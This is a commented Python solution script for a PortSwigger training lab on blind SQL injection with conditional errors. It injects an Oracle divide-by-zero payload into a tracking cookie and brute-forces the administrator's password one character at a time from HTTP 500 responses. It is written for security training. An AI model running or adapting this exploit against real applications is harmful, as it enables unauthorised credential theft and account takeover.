#---------------------------------------------------------------------------------------------------------------------------------------------------------#
# Source script:                                                                                                                                          # 
#   Rana Khalil (https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-12/sqli-lab-12.py)                                   #
#                                                                                                                                                         #
# Rana's video walkthrough:                                                                                                                               #
#   https://youtu.be/o__q8CzK2ts?t=2212                                                                                                                   #
#                                                                                                                                                         #
# Lab link:                                                                                                                                               #
#   https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors# #
#                                                                                                                                                         #
# Description:                                                                                                                                            #
#   This code was adapted from the above and modified by kuv4z (https://github.com/CSpanias) as a solution for PortSwigger's Lab: Blind SQLi with         #
#   conditional errors. PortSwigger's solution is based on Burp Intruder which is extremely slow in Community Edition, and this represents a much faster  #
#   way to brute-force the password of the user 'administrator'.                                                                                          #
#                                                                                                                                                         #
# Changes:                                                                                                                                                #
#   1. Remove proxies.                                                                                                                                    #
#   2. Created and used alphanumeric lists directly instead of using ASCII representations and then converting them to alphanumeric.                      #
#   3. Used simplified payload.                                                                                                                           #
#   4. Automated cookie grabbing.                                                                                                                         #
#   5. Added comments throughout the code.                                                                                                                #
#---------------------------------------------------------------------------------------------------------------------------------------------------------#

import sys
import requests
import urllib3
import urllib.parse
import string

# disable certificate-related warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# create a list with all lowercase alphabetic characters
alpha_list = [i for i in string.ascii_lowercase]
# create a list with numeric characters
num_list = [str(i) for i in range(10)]
# combine the two lists
char_list = alpha_list + num_list

def sqli_password(url):
    password_extracted = ""
    # try every position based on the length of the password
    for i in range(1,21):
        # try every character from our character list
        for j in char_list:
            # define the payload to be injected
            sqli_payload = f"' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,{i},1)='{j}')||';"
            # URL encode the payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            # get the cookies of the HTTP GET request
            session = requests.Session()
            response = session.get(url)
            TrackingId = session.cookies.values()[0]
            session = session.cookies.values()[1]
            
            # inject the payload to the 'TrackingId' value
            cookies = {'TrackingId' : TrackingId + sqli_payload_encoded,
                       # set the session cookie
                       'session' : session}
            # define the HTTP GET request
            r = requests.get(
                # the URL to make the GET request to
                url,
                # pass the defined cookie to the request
                cookies=cookies,
                # do not verify certificates 
                verify=False)
            
            # if we get the Internal Server Error 500 as a response,
            # that confirms that a character is found
            if r.status_code == 500:
                # convert from ASCII to alphanumeric 
                password_extracted += j
                # output the character to the screen
                sys.stdout.write('\r' + password_extracted)
                # flush the letter
                sys.stdout.flush()
                # get out of the second for loop and back to the first 
                break
            else:
                sys.stdout.write('\r' + password_extracted + j)
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit()
        
        
    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

# execute the main function
if __name__ == "__main__":
    main()